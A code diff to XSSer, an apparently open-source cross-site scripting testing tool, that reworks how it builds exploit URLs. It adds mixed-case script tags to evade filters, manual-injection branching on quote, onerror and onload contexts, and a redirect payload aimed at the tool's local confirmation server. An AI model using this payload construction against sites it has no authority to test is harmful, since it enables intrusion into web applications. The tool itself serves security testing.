@@ -29,6 +29,7 @@ except:
 
 from random import randint
 from base64 import b64encode, b64decode
+from http.cookies import SimpleCookie
 import core.fuzzing
 import core.fuzzing.vectors
 import core.fuzzing.DCP
@@ -657,7 +658,7 @@ class xsser(EncoderDecoder, XSSerReporter):
             referer = options.referer
         else:
             self.options.referer = referer
-        if options.cookie:
+        if options.cookie: # set formatted by user cookies
             cookie = options.cookie
         else:
             self.options.cookie = cookie
@@ -1568,48 +1569,103 @@ class xsser(EncoderDecoder, XSSerReporter):
     def generate_token_exploit(self, hashing, dest_url, payload):
         self_url = "http://localhost:19084/success/" + hashing
         shadow_js_inj = "document.location=document.location.hash.substring(1)"
-        shadow_inj = "<script>" + shadow_js_inj + "</script>"
+        shadow_inj = "<SCrIpT>" + shadow_js_inj + "</ScRiPt>"
         _e = self.encoding_permutations
-        if 'VECTOR' in dest_url:
-            dest_url = dest_url.replace('VECTOR', payload['payload'])
-        if '">PAYLOAD' in dest_url:
-            tok_url = dest_url.replace('">PAYLOAD', _e('">' + shadow_inj))
-            tok_url += '#' + self_url
-        elif "'>PAYLOAD" in dest_url:
-            tok_url = dest_url.replace("'>PAYLOAD", _e("'>" + shadow_inj))
-            tok_url += '#' + self_url
-        elif "javascript:PAYLOAD" in dest_url:
-            tok_url = dest_url.replace('javascript:PAYLOAD', self.encoding_permutations("window.location='" + self_url+"';"))
-            tok_url = dest_url.replace("javascript:PAYLOAD", _e("javascript:" + shadow_js_inj))
-            tok_url+= '#' + self_url
-        elif '"PAYLOAD"' in dest_url:
-            tok_url = dest_url.replace('"PAYLOAD"', '"' + self_url + '"')
-        elif "'PAYLOAD'" in dest_url:
-            tok_url = dest_url.replace("'PAYLOAD'", "'" + self_url + "'")
-        elif 'PAYLOAD' in dest_url and 'SRC' in dest_url:
-            tok_url = dest_url.replace('PAYLOAD', self_url)
-        elif "SCRIPT" in dest_url:
-            tok_url = dest_url.replace('PAYLOAD', shadow_js_inj)
-            tok_url += '#' + self_url
-        elif 'onerror="PAYLOAD"' in dest_url:
-            tok_url = dest_url.replace('onerror="PAYLOAD"', _e('onerror="' + shadow_inj + '"'))
-            tok_url+= '#' + self_url
-        elif 'onerror="javascript:PAYLOAD"' in dest_url:
-            tok_url = dest_url.replace('javascript:PAYLOAD', self.encoding_permutations("window.location='" + self_url+"';"))
-            tok_url = dest_url.replace('onerror="javascript:PAYLOAD"', _e('onerror="javascript:' + shadow_js_inj + '"'))
-            tok_url+= '#' + self_url
-        elif '<PAYLOAD>' in dest_url:
-            tok_url = dest_url.replace("<PAYLOAD>", _e(shadow_inj))
-            tok_url+= '#' + self_url
-        elif 'PAYLOAD' in dest_url:
-            tok_url = dest_url.replace("PAYLOAD", _e(shadow_inj))
-            tok_url+= '#' + self_url
-        elif 'href' in dest_url and 'PAYLOAD' in dest_url:
-            tok_url = dest_url.replace('PAYLOAD', self_url)
-        elif 'HREF' in dest_url and 'PAYLOAD' in dest_url:
-            tok_url = dest_url.replace('PAYLOAD', self_url)
-        elif 'url' in dest_url and 'PAYLOAD' in dest_url:
-            tok_url = dest_url.replace('PAYLOAD', self_url)
+        if self.options.script: # manual injections
+            if 'XSS' in dest_url:
+                dest_url = dest_url.replace('XSS', hashing)
+            elif 'XS1' in dest_url:
+                dest_url = dest_url.replace('XS1', hashing)
+            if "'>" in dest_url:
+                dest_url = dest_url.split("'>")[0]
+                tok_url = dest_url + _e("'>" + shadow_inj)
+                tok_url += '#' + self_url
+            elif '">' in dest_url:
+                dest_url = dest_url.split('">')[0]
+                tok_url = dest_url + _e('">' + shadow_inj)
+                tok_url += '#' + self_url
+            elif 'onerror=' in dest_url:
+                dest_url = dest_url.split('onerror=')[0]
+                tok_url = dest_url + _e('onerror=' + shadow_js_inj + ">")
+                tok_url+= '#' + self_url
+            elif 'onError=' in dest_url:
+                dest_url = dest_url.split('onError=')[0]
+                tok_url = dest_url + _e('onError=' + shadow_js_inj + ">")
+                tok_url+= '#' + self_url
+            elif 'onload=' in dest_url:
+                dest_url = dest_url.split('onload=')[0]
+                tok_url = dest_url + _e('onload=' + shadow_js_inj + ">")
+                tok_url+= '#' + self_url
+            elif 'onLoad=' in dest_url:
+                dest_url = dest_url.split('onLoad=')[0]
+                tok_url = dest_url + _e('onLoad=' + shadow_js_inj + ">")
+                tok_url+= '#' + self_url
+            else:
+                tok_url = dest_url + "#" + self_url
+        else: # default + auto injections
+            if 'VECTOR' in dest_url:
+                dest_url = dest_url.replace('VECTOR', payload['payload'])
+            if '">PAYLOAD' in dest_url:
+                tok_url = dest_url.replace('">PAYLOAD', _e('">' + shadow_inj))
+                tok_url += '#' + self_url
+            elif "'>PAYLOAD" in dest_url:
+                tok_url = dest_url.replace("'>PAYLOAD", _e("'>" + shadow_inj))
+                tok_url += '#' + self_url
+            elif "javascript:PAYLOAD" in dest_url:
+                tok_url = dest_url.replace('javascript:PAYLOAD', self.encoding_permutations("window.location='" + self_url+"';"))
+                tok_url = dest_url.replace("javascript:PAYLOAD", _e("javascript:" + shadow_js_inj))
+                tok_url+= '#' + self_url
+            elif '"PAYLOAD"' in dest_url:
+                tok_url = dest_url.replace('"PAYLOAD"', '"' + self_url + '"')
+            elif "'PAYLOAD'" in dest_url:
+                tok_url = dest_url.replace("'PAYLOAD'", "'" + self_url + "'")
+            elif 'PAYLOAD' in dest_url and 'SRC' in dest_url:
+                tok_url = dest_url.replace('PAYLOAD', self_url)
+            elif "SCRIPT" in dest_url:
+                tok_url = dest_url.replace('PAYLOAD', shadow_js_inj)
+                tok_url += '#' + self_url
+            elif 'onerror="PAYLOAD"' in dest_url:
+                tok_url = dest_url.replace('onerror="PAYLOAD"', _e('onerror="' + shadow_inj + '"'))
+                tok_url+= '#' + self_url
+            elif 'onerror="javascript:PAYLOAD"' in dest_url:
+                tok_url = dest_url.replace('javascript:PAYLOAD', self.encoding_permutations("window.location='" + self_url+"';"))
+                tok_url = dest_url.replace('onerror="javascript:PAYLOAD"', _e('onerror="javascript:' + shadow_js_inj + '"'))
+                tok_url+= '#' + self_url
+            elif 'onError="PAYLOAD"' in dest_url:
+                tok_url = dest_url.replace('onError="PAYLOAD"', _e('onError="' + shadow_inj + '"'))
+                tok_url+= '#' + self_url
+            elif 'onError="javascript:PAYLOAD"' in dest_url:
+                tok_url = dest_url.replace('javascript:PAYLOAD', self.encoding_permutations("window.location='" + self_url+"';"))
+                tok_url = dest_url.replace('onError="javascript:PAYLOAD"', _e('onError="javascript:' + shadow_js_inj + '"'))
+                tok_url+= '#' + self_url
+            elif 'onload="PAYLOAD"' in dest_url:
+                tok_url = dest_url.replace('onload="PAYLOAD"', _e('onload="' + shadow_inj + '"'))
+                tok_url+= '#' + self_url
+            elif 'onload="javascript:PAYLOAD"' in dest_url:
+                tok_url = dest_url.replace('javascript:PAYLOAD', self.encoding_permutations("window.location='" + self_url+"';"))
+                tok_url = dest_url.replace('onload="javascript:PAYLOAD"', _e('onload="javascript:' + shadow_js_inj + '"'))
+                tok_url+= '#' + self_url
+            elif 'onLoad="PAYLOAD"' in dest_url:
+                tok_url = dest_url.replace('onLoad="PAYLOAD"', _e('onLoad="' + shadow_inj + '"'))
+                tok_url+= '#' + self_url
+            elif 'onLoad="javascript:PAYLOAD"' in dest_url:
+                tok_url = dest_url.replace('javascript:PAYLOAD', self.encoding_permutations("window.location='" + self_url+"';"))
+                tok_url = dest_url.replace('onLoad="javascript:PAYLOAD"', _e('onLoad="javascript:' + shadow_js_inj + '"'))
+                tok_url+= '#' + self_url
+            elif '<PAYLOAD>' in dest_url:
+                tok_url = dest_url.replace("<PAYLOAD>", _e(shadow_inj))
+                tok_url+= '#' + self_url
+            elif 'PAYLOAD' in dest_url:
+                tok_url = dest_url.replace("PAYLOAD", _e(shadow_inj))
+                tok_url+= '#' + self_url
+            elif 'href' in dest_url and 'PAYLOAD' in dest_url:
+                tok_url = dest_url.replace('PAYLOAD', self_url)
+            elif 'HREF' in dest_url and 'PAYLOAD' in dest_url:
+                tok_url = dest_url.replace('PAYLOAD', self_url)
+            elif 'url' in dest_url and 'PAYLOAD' in dest_url:
+                tok_url = dest_url.replace('PAYLOAD', self_url)
+            else:
+                tok_url = dest_url + "#" + self_url
         return tok_url
 
     def do_token_check(self, orig_url, hashing, payload, query_string, dest_url): # searching for a [100% VULNERABLE] XSS exploit!
@@ -1627,11 +1683,10 @@ class xsser(EncoderDecoder, XSSerReporter):
                     if tok_url:
                         self.send_token_exploit(orig_url, tok_url, hashing, vector_found)
 
-    def generate_headless_cookies(self, orig_url): # generate cookies for headless browser engine
+    def generate_headless_cookies(self, orig_url): # generate cookies for internal headless browser engine
         self.driver.get(orig_url)
         r_cookies = self.driver.get_cookies() # get cookies
         if self.options.cookie:
-            from http.cookies import SimpleCookie # import SimpleCookie
             cookie = SimpleCookie()
             cookie.load(self.options.cookie)
             for key, morsel in cookie.items():
